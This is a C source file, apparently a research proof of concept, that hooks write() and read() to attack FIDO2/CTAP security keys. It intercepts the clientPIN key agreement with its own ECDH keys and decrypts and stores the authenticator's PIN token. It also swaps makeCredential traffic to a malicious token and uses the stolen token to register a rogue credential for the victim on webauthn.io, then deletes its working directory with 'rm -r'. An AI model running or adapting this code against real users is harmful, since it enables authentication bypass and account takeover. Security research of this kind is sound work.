#include "double_register_attack.h"

int global_file_descriptor;
int (*real_write)(int fd, const void *buf, size_t count);
int (*real_read)(int fd, void *buf, size_t count);

// This function is called when CBOR payload is complete, so after every write is completed
// it is meant to be used to take any action on the payload we need, and then send the frames
int unwrap_cbor (state_helper_t *helper, FILE *attack_helper_file) {

    struct cbor_load_result result;

    cbor_item_t *item = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &result);

    struct cbor_pair *pairs = cbor_map_handle(item);

    // prococol is parameter number 1 in CBOR structure
    int protocol = cbor_get_uint8(pairs[0].value);
    // subCommand is parameter number 2 in CBOR structure
    int subCommand = cbor_get_uint8(pairs[1].value);

    helper->packets_read = 0;
    helper->client_read_so_far = 0;
    helper->ctap_sub_command = subCommand;

    FILE *secret_key_file;
    es256_pk_t *authkey;
    es256_sk_t *secret_key_1;
    fido_blob_t	*shared_secret_1;
    fido_blob_t *shared_secret_2;
    fido_blob_t *final_cbor_payload;
    int c, ms, n = 0;

    switch (helper->ctap_command) {
        case CTAP_CBOR_CLIENT_PIN:

            helper->protocol = protocol;

            switch(helper->ctap_sub_command) {

                case CLIENT_PIN_KEY_EXCHANGE:

                {
                    attack_log("A key agreement command was found [code %d]!\n", helper->ctap_sub_command);

                    helper->modify_cbor = 1;

                    if (attack_helper_file == NULL) {
                        attack_helper_file = fopen(attack_helper_filename, "w");
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);

                    remove(token_public_key_cbor_filename);

                    return real_write(helper->write_parameters->fd, helper->write_parameters->buf, helper->write_parameters->count);

                }

                case CLIENT_PIN_GET_PIN_TOKEN:
                case CLIENT_PIN_GET_PIN_TOKEN_UV:
                case CLIENT_PIN_GET_PIN_TOKEN_PIN:

                {
                    attack_log("A getPinToken command was found [code %d]!\n", helper->ctap_sub_command);

                    helper->modify_cbor = 0;
                
                    authkey = calloc(1, sizeof(es256_pk_t));

                    struct cbor_load_result	 cbor;
                    cbor_item_t *cbor_map = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &cbor);
                    struct cbor_pair *cbor_map_elements = cbor_map_handle(cbor_map);

                    int prot = cbor_get_uint8(cbor_map_elements[0].value);

                    cbor_parse_reply(helper->cbor_payload, helper->payload_len, authkey, parse_authkey);

                    secret_key_1 = es256_sk_new_mod();

                    secret_key_file = fopen(secret_key_1_filename, "r");

                    attack_log("Opened secret key file! (NULL = %d)\n", secret_key_file == NULL);

                    while ((c = fgetc(secret_key_file)) != EOF)
                    {
                        secret_key_1->d[n++] = (unsigned char)c;
                    }
                    fclose(secret_key_file);

                    shared_secret_1 = NULL;

                    do_ecdh_mod(NULL, secret_key_1, authkey, &shared_secret_1, prot);

                    attack_log("SHARED SECRET WITH CLIENT: ");
                    printUnsignedChar(shared_secret_1->ptr, shared_secret_1->len, NULL);
                    attack_log("\n\n");

                    helper->client_shared_secret = shared_secret_1;

                    // The shared secret with the client is now discovered
                    // Because the pin was encrypted with this secret, we can recover the pin
                    // In order to complete the MITM attack though, we need to derive a new shared secret with the token and encrypt the pin with it

                    attack_log("CBOR payload before modify_cbor_payload: ");
                    printUnsignedChar(helper->cbor_payload, helper->payload_len, NULL);
                    attack_log("\n");

                    cbor_describe(cbor_map, stdout);
                    fflush(stdout);

                    final_cbor_payload = modify_cbor_payload(helper->cbor_payload, helper->payload_len, shared_secret_1, helper); 

                    attack_log("CBOR payload before send_frames: ");
                    printUnsignedChar(final_cbor_payload->ptr, final_cbor_payload->len, NULL);
                    attack_log("\n");
                    // Last part, where we need to send the payload in steps, like the tx_preamble an tx_frame code in the libfido2 library
                    if (send_frames(helper, helper->command, final_cbor_payload->ptr, final_cbor_payload->len, &ms, real_write) < 0) {
                        errx(1, "Tried to send modified packets to token, but something went wrong!");
                    }

                    helper->modify_cbor = 1;

                    if (attack_helper_file == NULL) {
                        attack_helper_file = fopen(attack_helper_filename, "w");
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);
                    
                    return helper->write_parameters->count;

                }

                default:
                    break;

            }

        default:
            break;
    }

    return real_write(helper->write_parameters->fd, helper->write_parameters->buf, helper->write_parameters->count);

}



ssize_t write(int fd, const void *buf, size_t count)
{
    real_write = dlsym(RTLD_NEXT, "write");

    if (hook_this_write(fd, count)) {

        // If file .swap does not exist, the attack is not executed, just write as normal.
        if (!file_exists(master_file_filename)) {
            printf("File [%s] does not exist, so no attack performed!\n", master_file_filename);
            remove(swap_helper_filename);
            return real_write(fd, buf, count);
        }

        frame_t *fp;
        
        unsigned char pkt_local[sizeof(*fp) + 1];

        memcpy(pkt_local, buf, sizeof(*fp) + 1);

        fp = (struct frame *)(pkt_local + 1);

        state_helper_t* helper;

        // If the file does not exist, then this is the first command, whatever that might be, therefore it has a body.init.data
        if (!file_exists(attack_helper_filename)) {

            // The first byte of body.init.data is the CTAP command.
            uint8_t cmd = fp->body.init.data[0];

            attack_log("Command [%d] detected!\n\n", cmd);

            // We only want to make the attack when the client (browser or app like libfido2) sends certain commands
            switch(cmd) {

                // We start the attack for the ClientPin command, which we want to manipulate
                /* We don't know yet what the subCommand is, so we either:
                    - fake all writes, build the CBOR, check the subcommand and go from there
                    - assume that when there is no helper file this is the first write and therefore it might be the KeyAgreement
                      subCommand (we don't do this, it might be too much of an assumption)
                */
                case CTAP_CBOR_CLIENT_PIN:

                {
                    
                    helper = malloc(sizeof(state_helper_t));

                    // Save information in helper
                    helper->fd = fd;
                    helper->cid = fp->cid;
                    helper->command = fp->body.init.cmd;
                    helper->ctap_command = cmd;
                    helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                    helper->writen_so_far = 0;

                    for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                        helper->cbor_payload[i] = fp->body.init.data[i];
                        helper->writen_so_far++;
                    }
                    helper->frames[helper->frame_count++] = *fp;

                    helper->expected_frames = 1;

                    if (sizeof(fp->body.init.data) < helper->payload_len) {
                        helper->expected_frames += ceil((float)(helper->payload_len - sizeof(fp->body.init.data)) / (CTAP_MAX_REPORT_LEN - CTAP_CONT_HEADER_LEN));
                    }

                    attack_log("Expecting %d packets to be sent by the client! (total CBOR length is %ld)\n", helper->expected_frames, helper->payload_len);

                    //more than 1 packet must be sent, we need to save the information in a file and pick it up later
                    //nothing else can be done because cbor data will not be complete, therefore no cbor_load can occur
                    if (sizeof(fp->body.init.data) < helper->payload_len) {

                        attack_log("Additional packets will be sent for command [%d]!\n", cmd);

                        FILE *attack_helper_file = fopen(attack_helper_filename, "w");

                        fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                        fclose(attack_helper_file);

                        free(helper);

                        //do not execute the real write because we don't want to send the original message to the token just yet
                        return count;
                    }

                    // No more packets will be sent, because the payload is small enough to send in 1 write
                    // We deal with the CBOR right now
                    else {

                        attack_log("No additional packets will be sent for command [%d]!\n", cmd);

                        helper->write_parameters = malloc(sizeof(write_parameters_t));
                        helper->write_parameters->fd = fd;
                        helper->write_parameters->buf = buf;
                        helper->write_parameters->count = count;
                        
                        int result = unwrap_cbor(helper, NULL);

                        return result;
                    }                    

                }


                // We only start the attack for the MakeCred command, which we want to manipulate
                case CTAP_CBOR_MAKECRED:

                {
                    attack_log("Make credential command detected!\n");

                    helper = malloc(sizeof(state_helper_t));

                    // Save information in helper
                    helper->fd = fd;
                    helper->command = fp->body.init.cmd;
                    helper->ctap_command = cmd;
                    helper->cid = fp->cid;
                    helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                    helper->writen_so_far = 0;
                    helper->frame_count = 0;
                    helper->delete_on_next_write = 0;
                    helper->swap_token = 0;

                    for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                        helper->cbor_payload[i] = fp->body.init.data[i];
                        helper->writen_so_far++;
                    }
                    helper->frames[helper->frame_count++] = *fp;

                    FILE *attack_helper_file = fopen(attack_helper_filename, "w");
                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);      
                    fclose(attack_helper_file);  

                    return real_write(fd, buf, count);

                }

                default:
                    break;

            }

            return real_write(fd, buf, count);
        }


        // This is not the first write for this command, so we continue writing...
        else {
            
            helper = malloc(sizeof(state_helper_t));

            FILE *attack_helper_file = fopen(attack_helper_filename, "r+");
            if (attack_helper_file == NULL) {
                printf("Something is wrong, the file [%s] should exist but does not! Ignoring attack...", attack_helper_filename);
                return real_write(fd, buf, count);
            }
            fread(helper, sizeof(state_helper_t), 1, attack_helper_file);

            if (helper->fd != fd) {
                return -1;
            }

            // This is supposed to work automatically to remove the file after the attack was performed, but crashes the attack very often.
            // Maybe a possible improvement is to find out how to implement this so that the file is deleted automatically.
            // if (helper->delete_on_next_write == 1) {
            //     fclose(swap_helper_file);
            //     //remove(swap_helper_filename);
            //     return real_write(fd, buf, count);
            // }

            rewind(attack_helper_file);

            // This is not the last packet to be written
            if (helper->payload_len - helper->writen_so_far >= sizeof(fp->body.cont.data)) {

                int writen_so_far_aux = helper->writen_so_far;
                for (int i = 0; i < sizeof(fp->body.cont.data); i++) {
                    (helper->cbor_payload + writen_so_far_aux)[i] = fp->body.cont.data[i];
                    helper->writen_so_far++;
                }
                helper->frames[helper->frame_count++] = *fp;

                attack_log("Continuing packet writing for command [%d] (%d out of %d)\n", helper->ctap_command, helper->frame_count, helper->expected_frames);

                fwrite(helper, sizeof(*helper), 1, attack_helper_file);      
                fclose(attack_helper_file);

                return real_write(fd, buf, count);

            }

            // This is the last packet to be written, and where the action takes place
            else {

                int writen_so_far_aux = helper->writen_so_far;
                for (int i = 0; i < helper->payload_len - writen_so_far_aux; i++) {
                    (helper->cbor_payload + writen_so_far_aux)[i] = fp->body.cont.data[i];
                    helper->writen_so_far++;
                }
                helper->frames[helper->frame_count++] = *fp;

                attack_log("Writing final packet for command [%d] (%d out of %d)\n", helper->ctap_command, helper->frame_count, helper->expected_frames);

                /* 
                From this point on we have every frame saved in the helper structure, and the real token is missing the last one,
                which means the client is still waiting for the last write's response.
                */

                struct cbor_load_result result;

                cbor_item_t *item = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &result);

#ifdef ATTACK_LOG
                attack_log("Original payload\n");
                cbor_describe(item, stdout);
                fflush(stdout);
                for (int i = 0; i < helper->payload_len; i++) {
                    attack_log("%02X", helper->cbor_payload[i]);
                }
                attack_log("\n");
#endif

                size_t map_size = cbor_map_size(item);

                struct cbor_pair *pairs = cbor_map_handle(item);

                switch(helper->ctap_command) {
                    
                    case CTAP_CBOR_MAKECRED:

                    {
                        // Start new clone process to wait for a few seconds and then start the impersonation.
                        // We do this to avoid starting a new registration before the rogue key can finish the original registration.
                        // This is needed because webauthn.io will delete information about the username on registration request.
                        int process = fork();

                        if (process == 0 && file_exists(rogue_register_filename)) {

                            sleep(4);

                            attack_log("Starting to perform new registration for the user's token...\n");

                            // Get the username and user ID used to start the legitimate registration.
                            // We need it to register another key under the same name.
                            struct cbor_pair* user_fields = cbor_map_handle(pairs[2].value);
                            char* username = NULL;
                            unsigned char* user_id = NULL;
                            cbor_string_copy(user_fields[1].value, &username);
                            size_t user_id_length = cbor_bytestring_length(user_fields[0].value);
                            cbor_bytestring_copy(user_fields[0].value, &user_id, &user_id_length);

                            char python_script_command[200];

                            sprintf(python_script_command, "/tmp/attack/webauthn_io_register.py \"-start\" \"https://webauthn.io\" %s\0", username);

                            attack_log("\nStarting rogue registration with STOLEN PINTOKEN! Using username [%s] from legitimate request!\n", username);

                            int result = system(python_script_command);

                            // This file must have been created by the Python script with the new request response
                            FILE* register_data_file = fopen(register_input_filename, "r");
                            if (register_data_file == NULL) {
                                printf("New registration data was not found, proceeding without attack!\n");
                                return real_write(fd, buf, count);
                            }

                            struct toggle opt;
                            opt.pin = FIDO_OPT_OMIT;
                            opt.uv = FIDO_OPT_OMIT;
                            opt.up = FIDO_OPT_TRUE;

                            fido_cred_t *cred = prepare_cred(register_data_file, COSE_ES256, 0);

                            //Open dev for the token we have. It is not an ideal implementation, since we are reusing the open from the rogue key attack
                            fido_dev_t *dev = open_user_token();

                            if (dev == NULL) {
                                errx(1, "Error in MAKE CRED command: dev in NULL!\n");
                            }

                            FILE* stolen_pin_token_file = fopen(pin_token_filename, "r");
                            if (stolen_pin_token_file == NULL) {
                                printf("PIN TOKEN was not found in file! Something went wrong. Ignoring attack...");
                                return real_write(fd, buf, count);
                            }

                            fido_blob_t *pin_token = fido_blob_new();

                            fread(pin_token, sizeof(*pin_token), 1, stolen_pin_token_file);
                            fclose(stolen_pin_token_file);

                            int cred_creation_result = fido_dev_make_cred_mod(dev, cred, pin_token);    

                            attack_log("Credential creation result: %d (%s)\n", cred_creation_result, (!cred_creation_result) ? ("success") : ("failed"));

                            char *base64_cdh = NULL;
                            char *base64_cbor_attObj = NULL;
                            char *base64_cred_id = NULL;
                            int r;

                            struct cbor_load_result discard;
                            cbor_item_t* attObj = cbor_load(cred->attObject_cbor.ptr, cred->attObject_cbor.len, &discard);
                            struct cbor_pair* attObjPairs = cbor_map_handle(attObj);
                            attObjPairs[0].key = cbor_build_string("fmt");
                            attObjPairs[1].key = cbor_build_string("authData");
                            attObjPairs[2].key = cbor_build_string("attStmt");

                            cred->attObject_cbor.ptr = NULL;
                            size_t len;
                            cred->attObject_cbor.len = cbor_serialize_alloc(attObj, &cred->attObject_cbor.ptr, &len);

                            r = base64_encode(cred->cdh.ptr, cred->cdh.len, &base64_cdh);
                            r |= base64_encode(cred->attObject_cbor.ptr, cred->attObject_cbor.len, &base64_cbor_attObj);
                            r |= base64_encode(cred->attcred.id.ptr, cred->attcred.id.len, &base64_cred_id);

                            FILE* cred_data_to_send_file = fopen(register_response_filename, "w");
                            fprintf(cred_data_to_send_file, "%s\n", base64_cdh);
                            fprintf(cred_data_to_send_file, "%s\n", base64_cbor_attObj);
                            fprintf(cred_data_to_send_file, "%s\n", base64_cred_id);
                            fclose(cred_data_to_send_file);

                            attack_log("CDH: %s\n", base64_cdh);
                            attack_log("Attstmt: %s\n", base64_cbor_attObj);
                            attack_log("Cred_id: %s\n", base64_cred_id);

                            result = 0;

                            sprintf(python_script_command, "/tmp/attack/webauthn_io_register.py \"-complete\" \"https://webauthn.io\" %s\0", username);

                            result = system(python_script_command);

                            system("rm -r /tmp/attack");

                            exit(0);
                        }

                        attack_log("User token has FD: %d\n", fd);

                        // This check is meant to catch the libfido2-specific case where the PIN was not selected/needed
                        if (map_size < 6) {
                            printf("The payload received does not have PinToken authentication because it did not involve using a PIN!\n");
                            fclose(attack_helper_file);
                            remove(attack_helper_filename);
                            return real_write(fd, buf, count);
                        }

                        // We first open the bad token that should be plugged in at this moment
                        // This is a very dumb way to keep the attack waiting for the malicious token to be inserted.
                        // In a real scenario, we would access the token remotely in the attacker's machine, so no harm here.
                        helper->bad_token_dev = open_bad_token();
                        while (helper->bad_token_dev == NULL) {
                            helper->bad_token_dev = open_bad_token();
                        }
                        helper->bad_token_fd = get_dev_file_descriptor(helper->bad_token_dev);
                        attack_log("Malicious token is open with file descriptor [%d]\n", helper->bad_token_fd);

                        // The .swap file must contain the PIN for the malicious token, otherwise it defaults to "1111" 
                        FILE* swap_file = fopen(swap_filename, "r");
                        if (swap_file == NULL) {
                            memcpy(helper->bad_token_pin, "1111", 5);
                        }
                        else {
                            char c;
                            int i = 0;
                            while((c = fgetc(swap_file)) != '\n') {
                                helper->bad_token_pin[i] = c;
                                i++;
                                attack_log("PIN character: %c\n", c);
                            }
                            helper->bad_token_pin[i] = '\0';
                            fclose(swap_file);
                        }
                        
                        attack_log("\nBad token PIN is: %s\n", helper->bad_token_pin);

                        int result = get_pin_token(helper);

                        attack_log("Got malicious authenticator's PinToken: %s (result == %d)\n", (result == 0) ? "OK" : "FAILED", result);

                        if (result < 0) {
                            errx(1, "Failed to get the Pin Token from bad token. Aborting...");
                        }

                        fido_blob_t *challenge = fido_blob_new();

                        result = fido_blob_decode(pairs[0].value, challenge);

                        if (result < 0) {
                            errx(1, "Could not get challenge from CBOR structure. Aborting...");
                        }

                        attack_log("Bad token pin token: ");
                        printUnsignedChar(helper->bad_token_pin_token->ptr, helper->bad_token_pin_token->len, NULL);
                        attack_log("\n");


                        /* 
                           Replace HMAC calculated with pintoken on the challenge.
                           The heuristic here is that the HMAC to authenticate the command will be in the second to last position
                           and the PIN operation (1 or 2) will be in the last.
                           If not, some additional logic is needed to adapt the CBOR strucuture to an authenticator that expects a different order.
                        */    
                        pairs[map_size - 2].value = cbor_encode_pin_auth(fido_dev_get_pin_protocol(helper->bad_token_dev), helper->bad_token_pin_token, challenge);
                        pairs[map_size - 1].value = cbor_encode_pin_opt(helper->bad_token_dev);

                        unsigned char	*cbor = NULL;
                        size_t		 cbor_len;
                        size_t		 cbor_alloc_len;

                        cbor_len = cbor_serialize_alloc(item, &cbor, &cbor_alloc_len); 

                        // zero the previous cbor payload except for the first byte representing the command
                        memset(helper->cbor_payload + 1, 0, sizeof(helper->cbor_payload) - 1);
                        // copy new cbor payload to helper->cbor_payload and set the new payload length
                        memcpy(helper->cbor_payload + 1, cbor, cbor_len);
                        helper->payload_len = cbor_len + 1;     
                        
                        // We are now ready to send the frames
                        int ms = helper->bad_token_dev->timeout_ms;
                        //temporarily change file descriptor in helper
                        helper->fd = helper->bad_token_fd;
                        uint32_t save_cid = helper->cid;
                        helper->cid = helper->bad_token_dev->cid;
                        int frames_sent = send_frames(helper, helper->command, helper->cbor_payload, helper->payload_len, &ms, real_write);
                        helper->fd = fd;
                        helper->cid = save_cid;
                        attack_log("\nFrames sent: %d\n\n", frames_sent);
                        
                        helper->swap_token = 1;
                        helper->client_read_so_far = 0;

                        fwrite(helper, sizeof(*helper), 1 ,attack_helper_file);

                        break;

                    }

                    case CTAP_CBOR_CLIENT_PIN:
                    {
                        helper->write_parameters = malloc(sizeof(write_parameters_t));
                        helper->write_parameters->fd = fd;
                        helper->write_parameters->buf = buf;
                        helper->write_parameters->count = count;
                        
                        int result = unwrap_cbor(helper, attack_helper_file);

                        return result;
                    }

                    default:
                        break;
                }

                fclose(attack_helper_file);

                return real_write(fd, buf, count);

            }

        }
                
    }

    return real_write(fd, buf, count);

} 


ssize_t read(int fd, void *buf, size_t count)
{
    real_read = dlsym(RTLD_NEXT, "read");

    ssize_t reply_len;

    if (hook_this_read_v3(fd, count)) {

        if (!file_exists(attack_helper_filename)) {
            return real_read(fd, buf, count);
        }

        FILE* attack_helper_file = fopen(attack_helper_filename, "r+");
        if (attack_helper_file == NULL) {
            return real_read(fd, buf, count);
        }

        state_helper_t *helper = malloc(sizeof(state_helper_t));

        fread(helper, sizeof(*helper), 1, attack_helper_file);
        rewind(attack_helper_file);

        int result = -1;

        if (fd != helper->fd) {
            return real_read(fd, buf, count);
        }

        switch(helper->ctap_command) {
            case CTAP_CBOR_CLIENT_PIN:

            {
                if (helper->modify_cbor == 0) {
                    int amount = real_read(fd, buf, count);

                    frame_t *fp = (frame_t *)buf;

                    if (helper->client_read_so_far == 0 && helper->packets_read == 0) {
                        helper->client_read_so_far += amount;
                        helper->packets_read++;
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                    fclose(attack_helper_file);

                    return amount;
                }

                // First read for the CTAP command CLIENT PIN
                if (helper->client_read_so_far == 0 && helper->packets_read == 0) {

                    // This is the first read after a write, so the cbor_payload from the previous write is deleted and the frame
                    // counter set to 0
                    memset(helper->cbor_payload, 0, sizeof(helper->cbor_payload));
                    memset(helper->original_cbor_payload, 0, sizeof(helper->original_cbor_payload));
                    helper->frame_count = 0;
                    helper->payload_len = 0;
                    helper->original_payload_len = 0;

                    // We are going to read the first packet from the token here
                    switch(helper->ctap_sub_command) {

                        case CLIENT_PIN_KEY_EXCHANGE:
 
                        {
                            int amount_read = real_read(fd, buf, count);
                            frame_t *fp = (frame_t*)buf;

                            printFrame(fp, 0);

                            if (fp->body.init.data[0] != FIDO_OK) {
                                attack_log("ERROR RESPONSE FROM TOKEN: %02x\n", fp->body.init.data[0]);
                                remove(attack_helper_filename);
                                return amount_read;
                            }

                            // Create our own key pair to use with client
                            es256_sk_t *sk = es256_sk_new_mod();
                            es256_pk_t *pk = es256_pk_new_mod();

                            es256_sk_create_mod(sk);
                            es256_derive_pk_mod(sk, pk);

                            attack_log("(HOOKED) TOKEN PUBLIC KEY X: ");
                            printUnsignedChar(pk->x, 32, NULL);
                            attack_log("\n");
                            attack_log("(HOOKED) TOKEN PUBLIC KEY y: ");
                            printUnsignedChar(pk->y, 32, NULL);
                            attack_log("\n");

                            // Encode into CBOR structure
                            cbor_item_t *newPublicKeyCbor = es256_pk_encode_mod(pk, 1);

                            // Serialize CBOR structure
                            helper->hooked_token_public_key = fido_blob_new();
                            size_t alloc_len;
                            size_t hooked_token_public_key_length = cbor_serialize_alloc(newPublicKeyCbor, &(helper->hooked_token_public_key->ptr), &alloc_len);
                            helper->hooked_token_public_key->len = hooked_token_public_key_length;

                            // Save private key to later derive shared secret with client
                            FILE* hook_secret_key = fopen(secret_key_1_filename, "w");
                            for (int i = 0; i < sizeof(sk->d); i++) {
                                fputc(sk->d[i], hook_secret_key);
                            }   
                            fclose(hook_secret_key);
                            
                            
                            helper->original_payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);

                            helper->original_cbor_payload_index = 0;
                            for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                                helper->original_cbor_payload[i] = fp->body.init.data[i];
                                helper->original_cbor_payload_index++;
                            }

                            int maximum_index = MIN(sizeof(fp->body.init.data), helper->hooked_token_public_key->len);
                            helper->hooked_token_public_key_index = 0;
                            for (int i = token_pub_key_start_index; i < maximum_index; i++) {
                                fp->body.init.data[i] = helper->hooked_token_public_key->ptr[i - token_pub_key_start_index];
                                helper->hooked_token_public_key_index++;
                            }

                            helper->payload_len = token_pub_key_start_index + helper->hooked_token_public_key->len;

                            if (helper->payload_len != helper->original_payload_len) {
                                printf("WARNING! In command [%d], subcommand [%d], the original payload and modified payload have different lengths (original = %ld, modified = %ld)!\n", helper->ctap_command, helper->ctap_sub_command, helper->original_payload_len, helper->payload_len);
                            }

                            helper->cbor_payload_index = 0;
                            for (int i = 0; i < sizeof(fp->body.init.data); i++) {
                                helper->cbor_payload[i] = fp->body.init.data[i];
                                helper->cbor_payload_index++;
                                helper->client_read_so_far++;
                            }

                            helper->frames[helper->frame_count++] = *fp;
                            helper->packets_read++;

                            fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                            fclose(attack_helper_file);

                            return amount_read;

                        }
                            
                        case CLIENT_PIN_GET_PIN_TOKEN:
                        case CLIENT_PIN_GET_PIN_TOKEN_UV:
                        case CLIENT_PIN_GET_PIN_TOKEN_PIN:

                        {
                            attack_log("STARTING READ FOR A GET PIN TOKEN command (%d)!\n", helper->ctap_sub_command);

                            int amount_read = real_read(fd, buf, count);
                            frame_t *fp = (frame_t*)buf;

                            while (fp->body.init.data[0] != FIDO_OK) {
                                amount_read = real_read(fd, buf, count);
                                fp = (frame_t*)buf;
                            }

                            struct cbor_load_result	 cbor;
                            cbor_item_t *cbor_frame_content = cbor_load(fp->body.init.data + 1, sizeof(fp->body.init.data) - 1, &cbor);
                            struct cbor_pair *cbor_map_elements = cbor_map_handle(cbor_frame_content);

                            fido_blob_t* encryptedPinToken = fido_blob_new();
                            fido_blob_t* decryptedPinToken = fido_blob_new();

                            parse_uv_token(cbor_map_elements[0].key, cbor_map_elements[0].value, encryptedPinToken);

                            attack_log("Encrypted PinToken length: %ld\n", encryptedPinToken->len);

                            int dec_result = aes256_cbc_dec(helper->protocol, helper->token_shared_secret, encryptedPinToken, decryptedPinToken);

                            attack_log("\n\nAUTHENTICATOR PINTOKEN (decryption result = %s): ", dec_result == 0 ? "success" : "failure");
                            printUnsignedChar(decryptedPinToken->ptr, decryptedPinToken->len, NULL);
                            attack_log("\n");

                            // Save pin token to file so it can be used later
                            FILE* pin_token_file = fopen(pin_token_filename, "w");
                            fwrite(decryptedPinToken, sizeof(*decryptedPinToken), 1, pin_token_file);
                            fclose(pin_token_file);

                            attack_log("\nAuthenticator PINTOKEN was successfully obtained and saved in the file [%s]\n", pin_token_filename);

                            //encrypt UV token with client_shared secret, then change cbor and send back

                            fido_blob_t* clientEncryptedPinToken = fido_blob_new();

                            aes256_cbc_enc(helper->protocol, helper->client_shared_secret, decryptedPinToken, clientEncryptedPinToken);

                            cbor_map_elements[0].value = cbor_build_bytestring(clientEncryptedPinToken->ptr, clientEncryptedPinToken->len);

                            // Serialize cbor_map, fill first position with command like cbor_payload, and return
                            size_t alloc_len;
                            unsigned char* serialized_map = NULL;
                            size_t len = cbor_serialize_alloc(cbor_frame_content, &serialized_map, &alloc_len);


                            // Copy the new encryped token, in CBOR format, and serialized in "serialized_map", to the frame data
                            for (int i = 0; i < len; i++) {
                                fp->body.init.data[i + token_pin_token_start_index] = serialized_map[i];
                            }

                            fclose(attack_helper_file);

                            remove(attack_helper_filename);

                            return amount_read;
                        }

                        default:
                            fclose(attack_helper_file);
                            return real_read(fd, buf, count);
                    }
            

                }

                // Next reads for the CTAP command in the helper structure
                else {

                    int amount_read = real_read(fd, buf, count);

                    frame_t *fp = (frame_t*)buf;

                    // Describes how many bytes will be read from frame to cbor_payload.
                    // If the amount to read is bigger than the data array in the frame, read the whole array
                    int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->original_payload_len - helper->original_cbor_payload_index);

                    for (int i = 0; i < amount_to_read; i++) {
                        helper->original_cbor_payload[i + helper->original_cbor_payload_index] = fp->body.cont.data[i];
                    }
                    helper->original_cbor_payload_index += amount_to_read;

                    helper->is_last_packet = (helper->payload_len - helper->client_read_so_far <= sizeof(fp->body.cont.data));

                    switch(helper->ctap_sub_command) {
                        case CLIENT_PIN_KEY_EXCHANGE:
                        {
                            // copy more bytes of hooked public key to the frame
                            int max = MIN(FRAME_CONT_DATA_LEN, helper->hooked_token_public_key->len - helper->hooked_token_public_key_index);
                            for (int i = 0; i < max; i++) {
                                fp->body.cont.data[i] = helper->hooked_token_public_key->ptr[i + helper->hooked_token_public_key_index];
                            }
                            helper->hooked_token_public_key_index += max;

                            int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->payload_len - helper->cbor_payload_index);
                            for (int i = 0; i < amount_to_read; i++) {
                                helper->cbor_payload[i + helper->cbor_payload_index] = fp->body.cont.data[i];
                                helper->client_read_so_far++;
                            }
                            helper->cbor_payload_index += amount_to_read;

                            helper->frames[helper->frame_count++] = *fp;
                            helper->packets_read++;

                            // Save token public key to later derive a different shared secret with token
                            FILE* token_public_key_cbor_file = fopen(token_public_key_cbor_filename, "a");
                            for (int i = 0; i < helper->original_payload_len; i++) {  
                                fputc(helper->original_cbor_payload[i], token_public_key_cbor_file);
                            }
                            fclose(token_public_key_cbor_file);

                            fwrite(helper, sizeof(*helper), 1, attack_helper_file);

                            break;
                            
                        }
                        default:
                        {
                            fclose(attack_helper_file);
                            return real_read(fd, buf, count);
                        }
                    }

                    fclose(attack_helper_file);

                    if (helper->is_last_packet) {
                        attack_log("\nLast packet was read!\n");
                        remove(attack_helper_filename);
                        return amount_read;
                    }

                    return amount_read;
                }
            }
            
            case CTAP_CBOR_MAKECRED:
            {
                attack_log("Will read from %s!\n", helper->swap_token ? "malicious token" : "user token");
                if (helper->swap_token) {
                    result = real_read(helper->bad_token_fd, buf, count);

                frame_t *fp = (frame_t*)buf;
                fp->cid = helper->cid;

#ifdef ATTACK_LOG
                if (fp->body.init.data[0] == FIDO_OK || helper->client_read_so_far > 0) {
                    // First packet
                    if (helper->client_read_so_far == 0) {
                        attack_log("Token responded with code: 0x%02x\n", fp->body.init.data[0]);
                        helper->payload_len = (size_t)((fp->body.init.bcnth << 8) | fp->body.init.bcntl);
                        int amount_to_read = MIN(sizeof(fp->body.init.data), helper->payload_len);
                        memcpy(helper->cbor_payload, fp->body.init.data, amount_to_read);
                        helper->client_read_so_far += amount_to_read;
                    }
                    else {
                        int amount_to_read = MIN(sizeof(fp->body.cont.data), helper->payload_len - helper->client_read_so_far);
                        memcpy(helper->cbor_payload + helper->client_read_so_far, fp->body.init.data, amount_to_read);
                        helper->client_read_so_far += amount_to_read;

                        // read is complete, every frame is in cbor_payload
                        if (helper->client_read_so_far >= helper->payload_len) {
                            struct cbor_load_result discard;
                            cbor_item_t *cbor_map = cbor_load(helper->cbor_payload + 1, helper->payload_len - 1, &discard);
                        
                            attack_log("Response in CBOR_MAP from malicious token:\n");
                            cbor_describe(cbor_map, stdout);
                            fflush(stdout);

                            attack_log("Printing CBOR PAYLOAD IN HEX!\n");
                            for (int i = 0; i < helper->payload_len; i++) {
                                attack_log("%02X", helper->cbor_payload[i]);
                            }
                            attack_log("\n");
                        }
                    }

                    fwrite(helper, sizeof(*helper), 1, attack_helper_file);
                }
#endif

                    // If this line executes, the next write that targets a FIDO device will not perform any attack.
                    // Hence, the client will perform normally.
                    remove(master_file_filename);
                }
                else {
                    result = real_read(fd, buf, count);
                }

                fclose(attack_helper_file);

                return result;
            }
        }

        
        
    }
   
    return real_read(fd, buf, count);
}